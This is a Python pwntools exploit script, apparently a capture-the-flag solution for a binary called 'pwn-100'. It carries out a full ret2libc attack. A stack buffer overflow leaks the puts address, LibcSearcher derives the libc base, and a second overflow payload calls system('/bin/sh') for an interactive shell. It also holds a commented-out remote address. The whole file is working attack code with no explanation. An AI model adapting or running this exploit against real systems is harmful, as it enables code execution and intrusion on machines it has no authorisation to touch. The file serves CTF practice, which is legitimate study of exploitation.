from pwn import *
from LibcSearcher import *

context(arch="amd64", os="linux", log_level="debug")

io = process("./pwn-100")
# io = remote("111.198.29.45", 31274)
elf = ELF("./pwn-100")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
print("puts_plt:" + str(puts_plt))
print("puts_got:" + str(puts_got))
main_addr = 0x4006b8

popret = 0x400763

# payload1 = "a" * 72 + p64(puts_plt) + p64(main_addr) + p64(puts_got)
payload1 = "a" * 72 + p64(popret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
payload1 += 'a' * (200 - len(payload1))

io.sendline(payload1)
io.recvuntil("bye~\n")
# puts_addr = int(io.recv(6), 16)
puts_addr = u64(io.recv(6).ljust(8, '\x00'))
print("puts_addr:" + str(hex(puts_addr)))

libc = LibcSearcher("puts", puts_addr)
libcbase = puts_addr - libc.dump("puts")
system_addr = libcbase + libc.dump("system")
binsh_addr = libcbase + libc.dump("str_bin_sh")
payload2 = 'a' * 71 + p64(popret) + p64(binsh_addr) + p64(system_addr)   # extra \x0a before
payload2 += 'a' * (200 - len(payload2))

# gdb.attach(io)

print("popret:" + hex(popret))
print("system_addr:" + hex(system_addr))
io.sendline(payload2)

io.interactive()